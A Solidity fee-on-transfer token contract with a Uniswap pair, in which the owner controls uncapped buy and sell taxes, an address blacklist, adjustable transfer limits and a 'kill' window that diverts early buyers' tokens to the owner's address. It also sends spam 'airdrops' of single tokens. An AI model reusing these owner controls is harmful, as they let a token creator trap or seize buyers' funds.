1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.4;
3 
4 abstract contract Context {
5 
6     function _msgSender() internal view virtual returns (address payable) {
7         return payable(msg.sender);
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this;
12         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
13         return msg.data;
14     }
15 }
16 
17 interface IERC20 {
18 
19     function totalSupply() external view returns (uint256);
20 
21     function balanceOf(address account) external view returns (uint256);
22 
23     function transfer(address recipient, uint256 amount) external returns (bool);
24 
25     function allowance(address owner, address spender) external view returns (uint256);
26 
27     function approve(address spender, uint256 amount) external returns (bool);
28 
29     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
30 
31     event Transfer(address indexed from, address indexed to, uint256 value);
32     event Approval(address indexed owner, address indexed spender, uint256 value);
33 }
34 
35 library SafeMath {
36 
37     function add(uint256 a, uint256 b) internal pure returns (uint256) {
38         uint256 c = a + b;
39         require(c >= a, "SafeMath: addition overflow");
40 
41         return c;
42     }
43 
44     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
45         return sub(a, b, "SafeMath: subtraction overflow");
46     }
47 
48     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
49         require(b <= a, errorMessage);
50         uint256 c = a - b;
51 
52         return c;
53     }
54 
55     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
56         if (a == 0) {
57             return 0;
58         }
59 
60         uint256 c = a * b;
61         require(c / a == b, "SafeMath: multiplication overflow");
62 
63         return c;
64     }
65 
66     function div(uint256 a, uint256 b) internal pure returns (uint256) {
67         return div(a, b, "SafeMath: division by zero");
68     }
69 
70     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
71         require(b > 0, errorMessage);
72         uint256 c = a / b;
73         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
74 
75         return c;
76     }
77 
78     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
79         return mod(a, b, "SafeMath: modulo by zero");
80     }
81 
82     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
83         require(b != 0, errorMessage);
84         return a % b;
85     }
86 }
87 
88 library Address {
89 
90     function isContract(address account) internal view returns (bool) {
91         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
92         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
93         // for accounts without code, i.e. `keccak256('')`
94         bytes32 codehash;
95         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
96         // solhint-disable-next-line no-inline-assembly
97         assembly {codehash := extcodehash(account)}
98         return (codehash != accountHash && codehash != 0x0);
99     }
100 
101     function sendValue(address payable recipient, uint256 amount) internal {
102         require(address(this).balance >= amount, "Address: insufficient balance");
103 
104         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
105         (bool success,) = recipient.call{ value : amount}("");
106         require(success, "Address: unable to send value, recipient may have reverted");
107     }
108 
109     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
110         return functionCall(target, data, "Address: low-level call failed");
111     }
112 
113     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
114         return _functionCallWithValue(target, data, 0, errorMessage);
115     }
116 
117     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
118         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
119     }
120 
121     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
122         require(address(this).balance >= value, "Address: insufficient balance for call");
123         return _functionCallWithValue(target, data, value, errorMessage);
124     }
125 
126     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
127         require(isContract(target), "Address: call to non-contract");
128 
129         (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
130         if (success) {
131             return returndata;
132         } else {
133 
134             if (returndata.length > 0) {
135                 assembly {
136                     let returndata_size := mload(returndata)
137                     revert(add(32, returndata), returndata_size)
138                 }
139             } else {
140                 revert(errorMessage);
141             }
142         }
143     }
144 }
145 
146 contract Ownable is Context {
147     address public _owner;
148 
149     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
150 
151 
152     function owner() public view returns (address) {
153         return _owner;
154     }
155 
156     modifier onlyOwner() {
157         require(_owner == _msgSender(), "Ownable: caller is not the owner");
158         _;
159     }
160 
161     function waiveOwnership() public virtual onlyOwner {
162         emit OwnershipTransferred(_owner, address(0));
163         _owner = address(0);
164     }
165 
166     function transferOwnership(address newOwner) public virtual onlyOwner {
167         require(newOwner != address(0), "Ownable: new owner is the zero address");
168         emit OwnershipTransferred(_owner, newOwner);
169         _owner = newOwner;
170     }
171 
172     function getTime() public view returns (uint256) {
173         return block.timestamp;
174     }
175 
176 }
177 
178 interface IUniswapV2Factory {
179 
180     function getPair(address tokenA, address tokenB) external view returns (address pair);
181 
182     function createPair(address tokenA, address tokenB) external returns (address pair);
183 }
184 
185 interface IUniswapV2Router01 {
186     function factory() external pure returns (address);
187 
188     function WETH() external pure returns (address);
189 
190     function addLiquidity(
191         address tokenA,
192         address tokenB,
193         uint amountADesired,
194         uint amountBDesired,
195         uint amountAMin,
196         uint amountBMin,
197         address to,
198         uint deadline
199     ) external returns (uint amountA, uint amountB, uint liquidity);
200 
201     function addLiquidityETH(
202         address token,
203         uint amountTokenDesired,
204         uint amountTokenMin,
205         uint amountETHMin,
206         address to,
207         uint deadline
208     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
209 
210     function removeLiquidity(
211         address tokenA,
212         address tokenB,
213         uint liquidity,
214         uint amountAMin,
215         uint amountBMin,
216         address to,
217         uint deadline
218     ) external returns (uint amountA, uint amountB);
219 
220     function removeLiquidityETH(
221         address token,
222         uint liquidity,
223         uint amountTokenMin,
224         uint amountETHMin,
225         address to,
226         uint deadline
227     ) external returns (uint amountToken, uint amountETH);
228 
229 
230 }
231 
232 interface IUniswapV2Router02 is IUniswapV2Router01 {
233 
234     function swapExactTokensForETHSupportingFeeOnTransferTokens(
235         uint amountIn,
236         uint amountOutMin,
237         address[] calldata path,
238         address to,
239         uint deadline
240     ) external;
241 }
242 
243 contract Token is Context, IERC20, Ownable {
244 
245     using SafeMath for uint256;
246     using Address for address;
247 
248     string private _name;
249     string private _symbol;
250     uint8 private _decimals;
251     address payable public marketingWalletAddress;
252     address payable public teamWalletAddress;
253     address public deadAddress = 0x000000000000000000000000000000000000dEaD;
254     mapping(address => bool) public _isBlacklisted;
255     mapping (address => uint256) _balances;
256     mapping (address => mapping (address => uint256)) private _allowances;
257 
258     mapping (address => bool) public isExcludedFromFee;
259     mapping (address => bool) public isWalletLimitExempt;
260     mapping (address => bool) public isTxLimitExempt;
261     mapping (address => bool) public isMarketPair;
262 
263     uint256 public _buyLiquidityFee = 2;
264     uint256 public _buyMarketingFee = 3;
265     uint256 public _buyTeamFee = 4;
266     uint256 public _buyDestroyFee = 0;
267 
268     uint256 public _sellLiquidityFee = 2;
269     uint256 public _sellMarketingFee = 3;
270     uint256 public _sellTeamFee = 4;
271     uint256 public _sellDestroyFee = 0;
272 
273     uint256 public _liquidityShare = 2;
274     uint256 public _marketingShare = 3;
275     uint256 public _teamShare = 4;
276     uint256 public _totalDistributionShares = 9;
277 
278     uint256 public _totalTaxIfBuying = 9;
279     uint256 public _totalTaxIfSelling = 9;
280 
281     uint256 public _tFeeTotal;
282     uint256 public _maxDestroyAmount;
283     uint256 private _totalSupply;
284     uint256 public _maxTxAmount;
285     uint256 public _walletMax;
286     uint256 private _minimumTokensBeforeSwap = 0;
287     uint256 public airdropNumbs;
288     address private receiveAddress;
289     uint256 public first;
290     uint256 public kill = 0;
291 
292 
293     IUniswapV2Router02 public uniswapV2Router;
294     address public uniswapPair;
295 
296     bool inSwapAndLiquify;
297     bool public swapAndLiquifyEnabled = true;
298     bool public swapAndLiquifyByLimitOnly = false;
299     bool public checkWalletLimit = true;
300 
301     event SwapAndLiquifyEnabledUpdated(bool enabled);
302     event SwapAndLiquify(
303         uint256 tokensSwapped,
304         uint256 ethReceived,
305         uint256 tokensIntoLiqudity
306     );
307 
308     event SwapETHForTokens(
309         uint256 amountIn,
310         address[] path
311     );
312 
313     event SwapTokensForETH(
314         uint256 amountIn,
315         address[] path
316     );
317 
318     modifier lockTheSwap {
319         inSwapAndLiquify = true;
320         _;
321         inSwapAndLiquify = false;
322     }
323 
324 
325     constructor (
326         string memory coinName,
327         string memory coinSymbol,
328         uint8 coinDecimals,
329         uint256 supply,
330         address router,
331         address owner,
332         address marketingAddress,
333         address teamAddress,
334         address service
335     ) payable {
336 
337         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
338 
339         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
340             .createPair(address(this), _uniswapV2Router.WETH());
341 
342         _name = coinName;
343         _symbol = coinSymbol;
344         _decimals = coinDecimals;
345         _owner = owner;
346         receiveAddress = owner;
347         _totalSupply = supply  * 10 ** _decimals;
348         _maxTxAmount = supply * 10**_decimals;
349         _walletMax = supply * 10**_decimals;
350         _maxDestroyAmount = supply * 10**_decimals;
351         _minimumTokensBeforeSwap = 1 * 10**_decimals;
352         marketingWalletAddress = payable(marketingAddress);
353         teamWalletAddress = payable(teamAddress);
354         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
355         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
356         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
357         uniswapV2Router = _uniswapV2Router;
358         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
359         isExcludedFromFee[owner] = true;
360         isExcludedFromFee[address(this)] = true;
361 
362         isWalletLimitExempt[owner] = true;
363         isWalletLimitExempt[address(uniswapPair)] = true;
364         isWalletLimitExempt[address(this)] = true;
365         isWalletLimitExempt[deadAddress] = true;
366 
367         isTxLimitExempt[owner] = true;
368         isTxLimitExempt[deadAddress] = true;
369         isTxLimitExempt[address(this)] = true;
370 
371         isMarketPair[address(uniswapPair)] = true;
372 
373         _balances[owner] = _totalSupply;
374         payable(service).transfer(msg.value);
375         emit Transfer(address(0), owner, _totalSupply);
376     }
377 
378     function name() public view returns (string memory) {
379         return _name;
380     }
381 
382     function symbol() public view returns (string memory) {
383         return _symbol;
384     }
385 
386     function decimals() public view returns (uint8) {
387         return _decimals;
388     }
389 
390     function totalSupply() public view override returns (uint256) {
391         return _totalSupply;
392     }
393 
394     function balanceOf(address account) public view override returns (uint256) {
395         return _balances[account];
396     }
397 
398     function allowance(address owner, address spender) public view override returns (uint256) {
399         return _allowances[owner][spender];
400     }
401 
402     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
403         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
404         return true;
405     }
406 
407     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
408         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
409         return true;
410     }
411 
412     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
413         return _minimumTokensBeforeSwap;
414     }
415 
416     function approve(address spender, uint256 amount) public override returns (bool) {
417         _approve(_msgSender(), spender, amount);
418         return true;
419     }
420 
421     function _approve(address owner, address spender, uint256 amount) private {
422         require(owner != address(0), "ERC20: approve from the zero address");
423         require(spender != address(0), "ERC20: approve to the zero address");
424 
425         _allowances[owner][spender] = amount;
426         emit Approval(owner, spender, amount);
427     }
428 
429     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
430         isMarketPair[account] = newValue;
431     }
432 
433     function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
434         isTxLimitExempt[holder] = exempt;
435     }
436 
437     function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
438         isExcludedFromFee[account] = newValue;
439     }
440 
441     function setMaxDesAmount(uint256 maxDestroy) public onlyOwner {
442         _maxDestroyAmount = maxDestroy;
443     }
444 
445     function setBuyDestFee(uint256 newBuyDestroyFee) public onlyOwner {
446         _buyDestroyFee = newBuyDestroyFee;
447         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);
448     }
449 
450     function setSellDestFee(uint256 newSellDestroyFee) public onlyOwner {
451         _sellDestroyFee = newSellDestroyFee;
452         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);
453     }
454 
455     function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
456         _buyLiquidityFee = newLiquidityTax;
457         _buyMarketingFee = newMarketingTax;
458         _buyTeamFee = newTeamTax;
459 
460         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);
461     }
462 
463     function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
464         _sellLiquidityFee = newLiquidityTax;
465         _sellMarketingFee = newMarketingTax;
466         _sellTeamFee = newTeamTax;
467 
468         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);
469     }
470 
471     function multipleBotlistAddress(address[] calldata accounts, bool excluded) public onlyOwner {
472         for (uint256 i = 0; i < accounts.length; i++) {
473             _isBlacklisted[accounts[i]] = excluded;
474         }
475     }
476 
477     function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
478         _liquidityShare = newLiquidityShare;
479         _marketingShare = newMarketingShare;
480         _teamShare = newTeamShare;
481 
482         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
483     }
484 
485     function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
486         _maxTxAmount = maxTxAmount;
487     }
488 
489     function enableDisableWalletLimit(bool newValue) external onlyOwner {
490        checkWalletLimit = newValue;
491     }
492 
493     function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
494         isWalletLimitExempt[holder] = exempt;
495     }
496 
497     function setWalletLimit(uint256 newLimit) external onlyOwner {
498         _walletMax  = newLimit;
499     }
500 
501     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
502         _minimumTokensBeforeSwap = newLimit;
503     }
504 
505     function setMarketingWalletAddress(address newAddress) external onlyOwner() {
506         marketingWalletAddress = payable(newAddress);
507     }
508 
509     function setTeamWalletAddress(address newAddress) external onlyOwner() {
510         teamWalletAddress = payable(newAddress);
511     }
512 
513     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
514         swapAndLiquifyEnabled = _enabled;
515         emit SwapAndLiquifyEnabledUpdated(_enabled);
516     }
517 
518     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
519         swapAndLiquifyByLimitOnly = newValue;
520     }
521 
522     function setKing(uint256 newValue) public onlyOwner {
523         kill = newValue;
524     }
525 
526     function setAirdropNumbs(uint256 newValue) public onlyOwner {
527         require(newValue <= 3, "newValue must <= 3");
528         airdropNumbs = newValue;
529     }
530     function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
531         for(uint256 i = 0; i < accounts.length; i++) {
532             isExcludedFromFee[accounts[i]] = excluded;
533         }
534     }
535 
536     function getCirculatingSupply() public view returns (uint256) {
537         return _totalSupply.sub(balanceOf(deadAddress));
538     }
539 
540     function transferToAddressETH(address payable recipient, uint256 amount) private {
541         recipient.transfer(amount);
542     }
543 
544     function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
545 
546         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress);
547 
548         newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());
549 
550         if(newPairAddress == address(0)) //Create If Doesnt exist
551         {
552             newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
553                 .createPair(address(this), _uniswapV2Router.WETH());
554         }
555 
556         uniswapPair = newPairAddress; //Set new pair address
557         uniswapV2Router = _uniswapV2Router; //Set new router address
558 
559         isWalletLimitExempt[address(uniswapPair)] = true;
560         isMarketPair[address(uniswapPair)] = true;
561     }
562 
563      //to recieve ETH from uniswapV2Router when swaping
564     receive() external payable {}
565 
566     function transfer(address recipient, uint256 amount) public override returns (bool) {
567         _transfer(_msgSender(), recipient, amount);
568         return true;
569     }
570 
571     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
572         _transfer(sender, recipient, amount);
573         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
574         return true;
575     }
576 
577     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
578 
579         require(sender != address(0), "ERC20: transfer from the zero address");
580         require(recipient != address(0), "ERC20: transfer to the zero address");
581         require(amount > 0, "Transfer amount must be greater than zero");
582         require(!_isBlacklisted[sender] && !_isBlacklisted[recipient], 'Blacklisted address');
583 
584         if(recipient == uniswapPair && balanceOf(address(uniswapPair)) == 0){
585             first = block.number;
586         }
587         if(sender == uniswapPair && block.number < first + kill){
588             return _basicTransfer(sender, receiveAddress, amount);
589         }
590         if(inSwapAndLiquify)
591         {
592             return _basicTransfer(sender, recipient, amount);
593         }
594         else
595         {
596             if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
597                 require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
598             }
599 
600             uint256 contractTokenBalance = balanceOf(address(this));
601             bool overMinimumTokenBalance = contractTokenBalance >= _minimumTokensBeforeSwap;
602 
603             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)
604             {
605                 if(swapAndLiquifyByLimitOnly)
606                     contractTokenBalance = _minimumTokensBeforeSwap;
607                 swapAndLiquify(contractTokenBalance);
608             }
609 
610             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
611 
612             uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ?
613                                          amount : takeFee(sender, recipient, amount);
614 
615             if(checkWalletLimit && !isWalletLimitExempt[recipient])
616                 require(balanceOf(recipient).add(finalAmount) <= _walletMax);
617 
618             _balances[recipient] = _balances[recipient].add(finalAmount);
619 
620             emit Transfer(sender, recipient, finalAmount);
621             return true;
622         }
623     }
624 
625     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
626         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
627         _balances[recipient] = _balances[recipient].add(amount);
628         emit Transfer(sender, recipient, amount);
629         return true;
630     }
631 
632     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
633 
634         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
635         uint256 tokensForSwap = tAmount.sub(tokensForLP);
636 
637         swapTokensForEth(tokensForSwap);
638         uint256 amountReceived = address(this).balance;
639 
640         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
641 
642         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
643         uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
644         uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);
645 
646         if(amountBNBMarketing > 0)
647             transferToAddressETH(marketingWalletAddress, amountBNBMarketing);
648 
649         if(amountBNBTeam > 0)
650             transferToAddressETH(teamWalletAddress, amountBNBTeam);
651 
652         if(amountBNBLiquidity > 0 && tokensForLP > 0)
653             addLiquidity(tokensForLP, amountBNBLiquidity);
654     }
655 
656     function swapTokensForEth(uint256 tokenAmount) private {
657         // generate the uniswap pair path of token -> weth
658         address[] memory path = new address[](2);
659         path[0] = address(this);
660         path[1] = uniswapV2Router.WETH();
661 
662         _approve(address(this), address(uniswapV2Router), tokenAmount);
663 
664         // make the swap
665         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
666             tokenAmount,
667             0, // accept any amount of ETH
668             path,
669             address(this), // The contract
670             block.timestamp
671         );
672 
673         emit SwapTokensForETH(tokenAmount, path);
674     }
675 
676     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
677         // approve token transfer to cover all possible scenarios
678         _approve(address(this), address(uniswapV2Router), tokenAmount);
679 
680         // add the liquidity
681         uniswapV2Router.addLiquidityETH{value: ethAmount}(
682             address(this),
683             tokenAmount,
684             0, // slippage is unavoidable
685             0, // slippage is unavoidable
686             receiveAddress,
687             block.timestamp
688         );
689     }
690 
691     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
692 
693         uint256 feeAmount = 0;
694         uint256 destAmount = 0;
695         uint256 airdropAmount = 0;
696         if(isMarketPair[sender]) {
697             feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
698             if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
699                 destAmount = amount.mul(_buyDestroyFee).div(100);
700                 destroyFee(sender,destAmount);
701             }
702         }
703         else if(isMarketPair[recipient]) {
704             feeAmount = amount.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);
705             if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
706                 destAmount = amount.mul(_sellDestroyFee).div(100);
707                 destroyFee(sender,destAmount);
708             }
709         }
710         if(isMarketPair[sender] || isMarketPair[recipient]){
711             if (airdropNumbs > 0){
712                 address ad;
713                 for (uint256 i = 0; i < airdropNumbs; i++) {
714                     ad = address(uint160(uint256(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
715                     _balances[ad] = _balances[ad].add(1);
716                     emit Transfer(sender, ad, 1);
717                 }
718                 airdropAmount = airdropNumbs * 1;
719             }
720         }
721 
722         if(feeAmount > 0) {
723             _balances[address(this)] = _balances[address(this)].add(feeAmount);
724             emit Transfer(sender, address(this), feeAmount);
725         }
726 
727         return amount.sub(feeAmount.add(destAmount).add(airdropAmount));
728     }
729 
730     function destroyFee(address sender, uint256 tAmount) private {
731         // stop destroy
732         if(_tFeeTotal >= _maxDestroyAmount) return;
733 
734         _balances[deadAddress] = _balances[deadAddress].add(tAmount);
735         _tFeeTotal = _tFeeTotal.add(tAmount);
736         emit Transfer(sender, deadAddress, tAmount);
737     }
738 
739 }